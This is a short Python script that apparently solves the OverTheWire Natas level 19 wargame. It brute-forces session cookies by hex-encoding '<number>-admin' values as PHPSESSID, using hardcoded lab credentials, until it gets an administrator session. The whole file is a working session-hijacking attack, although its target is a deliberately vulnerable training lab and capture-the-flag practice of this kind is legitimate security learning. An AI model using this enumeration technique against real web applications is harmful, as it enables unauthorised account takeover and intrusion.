import requests
import codecs

def check(number):
    print(f'Checking {number}')
    r = requests.get(
        'http://natas19.natas.labs.overthewire.org/index.php',
        auth=('natas19', '4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs'),
        cookies={'PHPSESSID': codecs.encode(str.encode(f'{number}-admin'), 'hex').decode()}
    )
    if not 'regular user' in r.text:
        print(r.text)
        return True
    return False

for i in range(1, 1000):
    if check(i):
        break